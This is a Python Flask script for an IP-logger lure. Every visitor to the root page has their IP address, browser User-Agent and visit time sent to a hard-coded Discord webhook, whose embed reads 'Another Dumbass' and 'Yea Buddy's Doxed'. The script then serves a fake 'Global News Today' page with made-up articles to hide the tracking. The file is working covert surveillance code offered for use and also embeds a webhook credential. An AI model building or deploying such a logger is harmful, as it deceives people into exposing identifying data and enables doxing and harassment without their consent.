from flask import Flask, request
import requests
import datetime

app = Flask(__name__)

# Replace with your actual Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1407294418083512370/s5ea20nPZcKZrXlwVXqnQhvkvhT3A7en5nB3tivkdeeNjGYhaB_LRqV6SGECAENBGcnr"

@app.route("/")
def home():
    # Grab visitor details
    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Format the message with Discord embed
    message = {
        "embeds": [{
            "title": "Another Dumbass",
            "description": "Yea Buddy's Doxed",
            "color": 0xFF0000,  # Red color
            "fields": [
                {
                    "name": "🌐 IP Address",
                    "value": f"`{ip}`",
                    "inline": True
                },
                {
                    "name": "🕒 Timestamp",
                    "value": f"`{timestamp}`",
                    "inline": True
                },
                {
                    "name": "🖥️ User Agent",
                    "value": f"```{user_agent}```",
                    "inline": False
                }
            ],
            "footer": {
                "text": "IP Logger Bot",
                "icon_url": "https://cdn.discordapp.com/emojis/1234567890123456789.png"
            },
            "thumbnail": {
                "url": "https://cdn.discordapp.com/emojis/🎯.png"
            }
        }]
    }

    # Send log to Discord
    try:
        requests.post(WEBHOOK_URL, json=message)
    except Exception as e:
        print("Error sending to Discord:", e)

    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Global News Today - Breaking News & Updates</title>
        <link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Georgia', serif;
                line-height: 1.6;
                background-color: #ffffff;
                color: #333;
            }
            
            .header {
                background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
                color: white;
                padding: 1rem 0;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            
            .nav-container {
                max-width: 1200px;
                margin: 0 auto;
                padding: 0 20px;
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            
            .logo {
                font-size: 28px;
                font-weight: bold;
                color: #fff;
            }
            
            .nav-menu {
                display: flex;
                list-style: none;
                gap: 30px;
            }
            
            .nav-menu a {
                color: white;
                text-decoration: none;
                font-weight: 500;
                transition: color 0.3s;
            }
            
            .nav-menu a:hover {
                color: #ffd700;
            }
            
            .container {
                max-width: 1200px;
                margin: 0 auto;
                padding: 40px 20px;
            }
            
            .breaking-news {
                background: #ff4444;
                color: white;
                padding: 10px 20px;
                margin-bottom: 30px;
                border-radius: 5px;
                animation: pulse 2s infinite;
            }
            
            @keyframes pulse {
                0% { opacity: 1; }
                50% { opacity: 0.8; }
                100% { opacity: 1; }
            }
            
            .main-article {
                display: grid;
                grid-template-columns: 2fr 1fr;
                gap: 40px;
                margin-bottom: 40px;
            }
            
            .article-content h1 {
                font-size: 2.5rem;
                margin-bottom: 20px;
                color: #1e3c72;
                line-height: 1.2;
            }
            
            .article-meta {
                color: #666;
                margin-bottom: 20px;
                font-style: italic;
            }
            
            .article-text {
                font-size: 1.1rem;
                margin-bottom: 20px;
                text-align: justify;
            }
            
            .sidebar {
                background: #f8f9fa;
                padding: 30px;
                border-radius: 10px;
                height: fit-content;
            }
            
            .sidebar h3 {
                color: #1e3c72;
                margin-bottom: 20px;
                border-bottom: 2px solid #1e3c72;
                padding-bottom: 10px;
            }
            
            .trending-item {
                padding: 15px 0;
                border-bottom: 1px solid #eee;
            }
            
            .trending-item:last-child {
                border-bottom: none;
            }
            
            .trending-item h4 {
                color: #333;
                margin-bottom: 5px;
            }
            
            .trending-item p {
                color: #666;
                font-size: 0.9rem;
            }
            
            .footer {
                background: #333;
                color: white;
                text-align: center;
                padding: 30px 0;
                margin-top: 50px;
            }
            
            @media (max-width: 768px) {
                .main-article {
                    grid-template-columns: 1fr;
                    gap: 20px;
                }
                
                .nav-menu {
                    display: none;
                }
                
                .article-content h1 {
                    font-size: 1.8rem;
                }
            }
        </style>
    </head>
    <body>
        <header class="header">
            <div class="nav-container">
                <div class="logo">📰 Global News Today</div>
                <nav>
                    <ul class="nav-menu">
                        <li><a href="#home">Home</a></li>
                        <li><a href="#world">World</a></li>
                        <li><a href="#politics">Politics</a></li>
                        <li><a href="#business">Business</a></li>
                        <li><a href="#tech">Technology</a></li>
                        <li><a href="#sports">Sports</a></li>
                    </ul>
                </nav>
            </div>
        </header>

        <div class="container">
            <div class="breaking-news">
                🚨 BREAKING: Major tech companies announce revolutionary breakthrough in artificial intelligence
            </div>

            <div class="main-article">
                <div class="article-content">
                    <h1>Scientists Discover Revolutionary Method to Combat Climate Change</h1>
                    <div class="article-meta">
                        By Sarah Johnson | Published 2 hours ago | Science & Environment
                    </div>
                    <div class="article-text">
                        In a groundbreaking development, researchers at the International Climate Research Institute have unveiled a revolutionary technology that could significantly reduce global carbon emissions by up to 40% within the next decade.
                    </div>
                    <div class="article-text">
                        The innovative approach combines advanced atmospheric processing with renewable energy systems, creating what scientists are calling "the most promising solution to climate change we've seen in decades."
                    </div>
                    <div class="article-text">
                        Dr. Michael Chen, lead researcher on the project, stated: "This technology represents a paradigm shift in how we approach environmental conservation. The initial results exceed our most optimistic projections."
                    </div>
                    <div class="article-text">
                        The research team plans to begin large-scale testing next month, with potential implementation starting in major cities worldwide by 2025. Environmental groups have praised the development as "a beacon of hope for future generations."
                    </div>
                </div>

                <div class="sidebar">
                    <h3>Trending Now</h3>
                    <div class="trending-item">
                        <h4>Global Markets Surge Following Tech Announcement</h4>
                        <p>Stock markets worldwide see significant gains...</p>
                    </div>
                    <div class="trending-item">
                        <h4>Space Mission Discovers New Potentially Habitable Planet</h4>
                        <p>NASA confirms existence of Earth-like exoplanet...</p>
                    </div>
                    <div class="trending-item">
                        <h4>Medical Breakthrough Offers Hope for Cancer Patients</h4>
                        <p>New treatment shows 95% success rate in trials...</p>
                    </div>
                    <div class="trending-item">
                        <h4>International Summit Addresses Global Food Security</h4>
                        <p>World leaders propose comprehensive action plan...</p>
                    </div>
                </div>
            </div>
        </div>

        <footer class="footer">
            <p>&copy; 2024 Global News Today. All rights reserved. | Privacy Policy | Terms of Service | Contact Us</p>
        </footer>
    </body>
    </html>
    '''

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
